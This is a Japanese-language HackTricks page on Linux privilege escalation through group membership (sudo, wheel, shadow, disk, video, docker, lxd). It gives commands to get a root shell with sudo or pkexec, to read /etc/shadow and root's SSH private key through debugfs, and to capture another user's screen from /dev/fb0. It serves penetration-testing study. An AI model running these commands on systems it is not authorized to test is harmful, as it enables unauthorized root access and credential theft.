<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝したいですか？** または、**PEASSの最新バージョンにアクセスしたいですか？** または、**HackTricksをPDFでダウンロードしたいですか？** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


# Sudo/Admin グループ

## **PE - 方法1**

**時には**、**デフォルトで（または一部のソフトウェアが必要とするために）** **/etc/sudoers** ファイルの中に、次のような行があることがあります：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、**sudoまたはadminグループに所属するユーザーはsudoとして何でも実行できる**ことを意味します。

もし状況がそうであるなら、**rootになるためには単に以下を実行するだけです**:
```text
sudo su
```
## PE - メソッド2

すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるかどうかを確認します：
```bash
find / -perm -4000 2>/dev/null
```
もし、バイナリファイルpkexecがSUIDバイナリであり、sudoまたはadminに所属している場合、おそらくpkexecを使用してバイナリをsudoとして実行できるでしょう。
以下の内容を確認してください：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
以下では、どのグループが**pkexec**を実行することが許可されているか、および一部のLinuxではデフォルトで**sudo**または**admin**のいずれかのグループが表示されることがあります。

**rootになるためには、次のコマンドを実行します**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
もし**pkexec**を実行しようとして、以下の**エラー**が表示された場合:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**権限がないわけではなく、GUIなしで接続されていないためです**。この問題の回避策はこちらにあります：[https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です：

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheelグループ

**時々**、**デフォルトで**、**/etc/sudoers**ファイルの中にこの行が見つかることがあります:
```text
%wheel	ALL=(ALL:ALL) ALL
```
これは、**wheelグループに所属するユーザーはsudoとして何でも実行できる**ことを意味します。

もし上記が当てはまる場合、**rootになるためには単に以下を実行するだけです**:
```text
sudo su
```
# シャドウグループ

**シャドウグループ**のユーザーは、**/etc/shadow** ファイルを**読み取る**ことができます。
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
# ディスクグループ

この特権は、マシン内のすべてのデータにアクセスできるため、ほぼルートアクセスと同等です。

ファイル：`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
注意してください、debugfsを使用すると**ファイルを書き込む**こともできます。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします：
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
しかし、rootが所有するファイル（`/etc/shadow`や`/etc/passwd`など）を書き込もうとすると、「**Permission denied**」のエラーが発生します。

# Video Group

コマンド`w`を使用すると、**システムにログインしているユーザー**を見つけることができ、以下のような出力が表示されます：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**は、ユーザー**yossiが物理的に**マシンの端末にログインしていることを意味します。

**videoグループ**は、画面出力を表示する権限を持っています。基本的に、画面を観察することができます。これを行うには、現在の画面のイメージを生データで取得し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存され、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**生のイメージ**を**開く**には、**GIMP**を使用し、**`screen.raw`**ファイルを選択し、ファイルタイプとして**生のイメージデータ**を選択します：

![](../../.gitbook/assets/image%20%28208%29.png)

次に、画面で使用されている幅と高さを変更し、さまざまなイメージタイプを確認します（画面をより良く表示するものを選択します）：

![](../../.gitbook/assets/image%20%28295%29.png)

# ルートグループ

デフォルトでは、**ルートグループのメンバー**は、特権をエスカレートするために使用できる**一部のサービス**の設定ファイルや**ライブラリ**ファイルなど、**他の興味深いもの**を変更することができるようです...

**ルートメンバーが変更できるファイルを確認します**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Dockerグループ

ホストマシンのルートファイルシステムをインスタンスのボリュームにマウントすることができます。そのため、インスタンスが起動するとすぐにそのボリュームに`chroot`がロードされます。これにより、実質的にマシン上でroot権限を取得することができます。

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxdグループ

[lxc - 特権エスカレーション](lxd-privilege-escalation.md)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**または**Telegramグループ**に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**してください。

</details>
